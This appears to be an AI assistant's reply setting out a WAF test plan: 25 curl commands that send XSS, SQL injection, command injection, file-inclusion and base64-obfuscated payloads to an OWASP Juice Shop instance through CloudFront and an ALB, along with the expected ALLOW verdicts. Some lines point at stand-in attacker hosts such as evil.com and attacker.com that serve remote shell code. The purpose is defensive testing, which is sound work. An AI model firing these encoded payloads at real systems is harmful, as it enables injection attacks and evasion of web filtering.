 USER_AGENT="dlpaasrngb6ue.cloudfront.net"
  CF_ENDPOINT="https://dlpaasrngb6ue.cloudfront.net"
  ALB_ENDPOINT="https://juice-shop-alb-1282716061.eu-west-1.elb.amazonaws.com"

  Variant 1/5 — POST (body) → CloudFront

  ## juiceshop-0014 (xss · nested-tag evasion)
  curl -v -k -X POST "$CF_ENDPOINT/rest/user/login" -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0014" -H "X-Test-Category: xss" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E" \
    -d '{"q": "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"}'

  ## juiceshop-0053 (sqli · double URL-encoded OR 1=1)
  curl -v -k -X POST "$CF_ENDPOINT/rest/user/login" -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0053" -H "X-Test-Category: sqli" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %2527%2520OR%25201%253D1--" \
    -d '{"q": "%2527%2520OR%25201%253D1--"}'

  ## juiceshop-0125 (cmdi · double URL-encoded && whoami)
  curl -v -k -X POST "$CF_ENDPOINT/rest/user/login" -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0125" -H "X-Test-Category: cmdi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %2526%2526whoami" \
    -d '{"q": "%2526%2526whoami"}'

  ## juiceshop-0153 (lfi · data URI scheme with base64 PHP)
  curl -v -k -X POST "$CF_ENDPOINT/rest/user/login" -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0153" -H "X-Test-Category: lfi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==" \
    -d '{"q": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="}'

  ## juiceshop-0168 (rfi · external shell URL)
  curl -v -k -X POST "$CF_ENDPOINT/rest/user/login" -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0168" -H "X-Test-Category: rfi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: http://evil.com/shell.txt" \
    -d '{"q": "http://evil.com/shell.txt"}'

  Variant 2/5 — GET querystring (?q=…) → CloudFront

  ## juiceshop-0057 (xss · ' #)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search?q=%27%23" \
    -H "X-Test-Id: juiceshop-0057" -H "X-Test-Category: xss" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %27%23"

  ## juiceshop-0050 (sqli · OR 1=1--)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search?q=%27%20OR%201=1--" \
    -H "X-Test-Id: juiceshop-0050" -H "X-Test-Category: sqli" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %27%20OR%201=1--"

  ## juiceshop-0125 (cmdi · &&whoami)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search?q=%2526%2526whoami" \
    -H "X-Test-Id: juiceshop-0125" -H "X-Test-Category: cmdi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %2526%2526whoami"

  ## juiceshop-0169 (rfi · hex-encoded attacker URL)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search?q=%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt" \
    -H "X-Test-Id: juiceshop-0169" -H "X-Test-Category: rfi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %68%74%74%70%3a%2f%2fattacker.com%2fcode.txt"

  ## juiceshop-0036 (base64 · obfuscated <script>)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search?q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" \
    -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

  Variant 3/5 — GET-with-body → ALB direct (CloudFront rejects this shape)

  ## juiceshop-0014 (xss · nested-tag evasion)
  curl -v -k --http1.1 -X GET "$ALB_ENDPOINT/rest/products/search" \
    -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0014" -H "X-Test-Category: xss" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E" \
    --data-raw '{"q": "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"}'

  ## juiceshop-0050 (sqli · OR 1=1--)
  curl -v -k --http1.1 -X GET "$ALB_ENDPOINT/rest/products/search" \
    -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0050" -H "X-Test-Category: sqli" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %27%20OR%201=1--" \
    --data-raw '{"q": "%27%20OR%201=1--"}'

  ## juiceshop-0125 (cmdi · &&whoami)
  curl -v -k --http1.1 -X GET "$ALB_ENDPOINT/rest/products/search" \
    -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0125" -H "X-Test-Category: cmdi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %2526%2526whoami" \
    --data-raw '{"q": "%2526%2526whoami"}'

  ## juiceshop-0169 (rfi · hex-encoded attacker URL)
  curl -v -k --http1.1 -X GET "$ALB_ENDPOINT/rest/products/search" \
    -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0169" -H "X-Test-Category: rfi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %68%74%74%70%3a%2f%2fattacker.com%2fcode.txt" \
    --data-raw '{"q": "%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt"}'

  ## juiceshop-0036 (base64 · obfuscated <script>)
  curl -v -k --http1.1 -X GET "$ALB_ENDPOINT/rest/products/search" \
    -H "Content-Type: application/json" \
    -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" \
    --data-raw '{"q": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}'

  Variant 4/5 — GET with cookie (Cookie: q=…) → CloudFront

  ## juiceshop-0014 (xss · nested-tag evasion)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search" \
    -H "X-Test-Id: juiceshop-0014" -H "X-Test-Category: xss" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E" \
    -H "Cookie: q=%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"

  ## juiceshop-0050 (sqli · OR 1=1--)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search" \
    -H "X-Test-Id: juiceshop-0050" -H "X-Test-Category: sqli" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %27%20OR%201=1--" \
    -H "Cookie: q=%27%20OR%201=1--"

  ## juiceshop-0125 (cmdi · &&whoami)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search" \
    -H "X-Test-Id: juiceshop-0125" -H "X-Test-Category: cmdi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %2526%2526whoami" \
    -H "Cookie: q=%2526%2526whoami"

  ## juiceshop-0169 (rfi · hex-encoded attacker URL)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search" \
    -H "X-Test-Id: juiceshop-0169" -H "X-Test-Category: rfi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %68%74%74%70%3a%2f%2fattacker.com%2fcode.txt" \
    -H "Cookie: q=%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt"

  ## juiceshop-0036 (base64 · obfuscated <script>)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search" \
    -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" \
    -H "Cookie: q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

  Variant 5/5 — GET with payload in URI path → CloudFront

  ## juiceshop-0002 (xss · double URL-encoded <script>)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search/%253Cscript%253Ealert(1)%253C/script%253E" \
    -H "X-Test-Id: juiceshop-0002" -H "X-Test-Category: xss" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %253Cscript%253Ealert(1)%253C/script%253E"

  ## juiceshop-0050 (sqli · OR 1=1--)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search/%27%20OR%201=1--" \
    -H "X-Test-Id: juiceshop-0050" -H "X-Test-Category: sqli" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %27%20OR%201=1--"

  ## juiceshop-0125 (cmdi · &&whoami)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search/%2526%2526whoami" \
    -H "X-Test-Id: juiceshop-0125" -H "X-Test-Category: cmdi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %2526%2526whoami"

  ## juiceshop-0169 (rfi · hex-encoded attacker URL)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search/%68%74%74%70%3a%2f%2fattacker.com%2fcode.txt" \
    -H "X-Test-Id: juiceshop-0169" -H "X-Test-Category: rfi" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: %68%74%74%70%3a%2f%2fattacker.com%2fcode.txt"

  ## juiceshop-0036 (base64 · obfuscated <script>)
  curl -v -k -X GET "$CF_ENDPOINT/rest/products/search/PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" \
    -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" \
    -H "User-Agent: $USER_AGENT" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

  Expected outcome for the demo

  For all 25 the WAF logs should show identical verdicts:

  ┌────────────────────────────────────────────┬────────────────────────────────────────────────────────┬───────────────────┐
  │                   Layer                    │                         action                         │ terminatingRuleId │
  ├────────────────────────────────────────────┼────────────────────────────────────────────────────────┼───────────────────┤
  │ CloudFront WAF (aws-waf-logs-…cloudfront…) │ ALLOW                                                  │ Default_Action    │
  ├────────────────────────────────────────────┼────────────────────────────────────────────────────────┼───────────────────┤
  │ ALB regional WAF                           │ ALLOW                                                  │ Default_Action    │
  ├────────────────────────────────────────────┼────────────────────────────────────────────────────────┼───────────────────┤
  │ HTTP response                              │ 500 (origin error) — sometimes 401 on /rest/user/login │ —                 │
  └────────────────────────────────────────────┴────────────────────────────────────────────────────────┴───────────────────┘

  Filter logs by httpRequest.headers[X-Test-Id] to pull each test individually.

  Two caveats to flag for your manager up-front

  1. Variant 3 (GET-with-body) hits the ALB hostname directly, not CloudFront. Reason: CloudFront returns 403 at the edge for any GET with a body (per AWS spec — see the prior message). The pytest framework also hits the ALB (backup_tf_files/Makefile:5), so this matches the pytest path.
  2. Variant 5 (GET-URI) sends the payload as a path segment, so the URL contains characters like %27, %2526, etc. These will not URL-decode at the curl level (curl sends the URI verbatim) — the WAF receives the encoded form, which is exactly what the pytest run sent.

✻ Cogitated for 2m 47s
